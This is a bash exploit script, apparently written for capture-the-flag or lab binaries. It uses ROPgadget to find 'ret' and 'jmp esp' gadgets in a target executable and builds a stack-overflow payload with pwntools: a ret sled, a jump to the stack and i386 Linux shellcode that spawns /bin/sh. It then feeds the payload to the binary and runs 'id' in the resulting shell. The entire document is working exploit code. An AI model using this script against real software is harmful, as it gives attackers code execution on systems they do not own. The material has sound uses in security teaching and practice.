#!/bin/bash

python2 -c 'import ropgadget, pwn' || (echo pwntools and ROPgadget are required; exit 1) || exit 1

ROPgadget --binary "$1" > gadgets.txt

gRET=$(grep ' : ret$' gadgets.txt | cut -b -10)
gJMP_ESP=$(grep ' : jmp esp$' gadgets.txt | cut -b -10)

if [ -z "$gRET" ] || [ -z "$gJMP_ESP" ]
then
    echo "[-] Failed to find gadget"
    exit 1
fi

echo "[+] ret     at $gRET"
echo "[+] jmp esp at $gJMP_ESP"

echo "[+] generating payload"
pwn asm -c i386 ".rept 16; .long $gRET; .endr; .long $gJMP_ESP" > payload
pwn shellcraft i386.linux.sh >> payload
echo >> payload

xxd -g1 payload | sed 's/^/[*] /'

echo "[+] executing payload"

(cat payload; sleep 0.1; echo id) | $(dirname "$1")/$(basename "$1")
